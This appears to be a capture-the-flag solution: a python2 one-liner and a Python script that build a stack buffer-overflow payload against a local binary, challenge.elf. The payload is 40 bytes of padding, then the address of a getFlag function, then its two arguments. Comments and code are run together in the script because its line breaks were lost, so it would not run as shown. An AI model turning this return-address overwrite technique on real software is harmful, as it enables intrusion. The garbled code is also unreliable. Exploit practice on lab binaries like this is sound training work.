1



python2 -c 'print "A"*40 + "\x14\x92\x04\x08" + "E"*4 + "\x01\x00\x00\x00" + "\x23\x00\x00\x00"  ' > payload 

import subprocess 
# Address of getFlag (0x08049214) in little-endian formatgetFlag_address = b'\x14\x92\x04\x08'
# Arguments for getFlag: param_1 = 1, param_2 = 35param_1 = b'\x01\x00\x00\x00'  
# 1 in little-endianparam_2 = b'\x23\x00\x00\x00'  
# 35 in little-endian# Overflow the buffer and overwrite the return addresspayload = b'A' * 40  # Adjusted padding size (try 40 bytes)payload += getFlag_address  
# Address of getFlag()payload += param_1  # Argument 1 for getFlagpayload += param_2  # Argument 2 for getFlag# Run the challenge.elf program with the crafted payloadsubprocess.run(['./challenge.elf'], input=payload)